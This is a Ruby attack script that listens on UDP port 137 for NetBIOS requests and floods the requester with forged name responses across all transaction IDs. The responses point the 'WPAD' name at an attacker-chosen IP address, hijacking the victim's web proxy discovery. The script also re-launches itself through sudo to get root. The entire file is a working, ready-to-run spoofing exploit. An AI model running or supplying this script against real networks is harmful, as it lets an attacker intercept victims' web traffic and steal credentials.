#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'socket'
require 'ipaddr'

def get_root
  if RUBY_PLATFORM.index("linux") && Process.euid != 0
    this_sudo = `which rvmsudo`.index("rvmsudo") ? "rvmsudo" : "sudo"
    this_ruby = File.readlink("/proc/self/exe")
    args = [this_sudo, this_ruby, __FILE__, *ARGV]
    exec(*args)
  end
end

def get_socket
  udp = UDPSocket.new
  udp.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, true)
  udp.bind('0.0.0.0', 137)
  udp
end

def usage
  $stderr.puts "Usage: #{$0} [wpad-server-ip] <pps-rate>"
  exit(1)
end

wpad_addr = IPAddr.new( ARGV[0] || usage() )
targ_rate = ( ARGV[1] || 30_000 ).to_i
targ_port = nil
targ_addr = nil

get_root

loop do

  sock = get_socket

  $stdout.puts ["[*] Listening for NetBIOS requests...."]

  while (r = sock.recvfrom(65535))
    next unless r
    data, addr_info = r
    targ_port = addr_info[1]
    targ_addr = addr_info[3]
    break
  end

  sock.connect(targ_addr, targ_port)

  $stdout.puts("[*]  >> NetBIOS request from #{targ_addr}:#{targ_port}...")

  payload = ["FFFF85000000000100000000204648464145424545434143414341434143414341434143414341434143414141000020000100FFFFFF000600000FFFFFFFF"].pack("H*")
  payload[58,4] = wpad_addr.hton

  stime = Time.now.to_f
  pcnt = 0
  pps  = 0

  $stdout.puts("[*]  >> Spamming WPAD responses to #{targ_addr}:#{targ_port} at #{targ_rate}/pps...")

  live = true
  while live
    0.upto(65535) do |txid|
      begin
        payload[0,2] = [txid].pack("n")
        sock.write(payload)
        pcnt += 1

        pps = (pcnt / (Time.now.to_f - stime)).to_i
        if pps > targ_rate
          sleep(0.01)
        end
      rescue Errno::ECONNREFUSED
        $stdout.puts "[*]  >> Error: Target sent us an ICMP port unreachable, port is likely closed"
        live = false
        break
      end
    end
  end

  $stdout.puts("[*]  >> Cleaning up...")

  sock.close
end
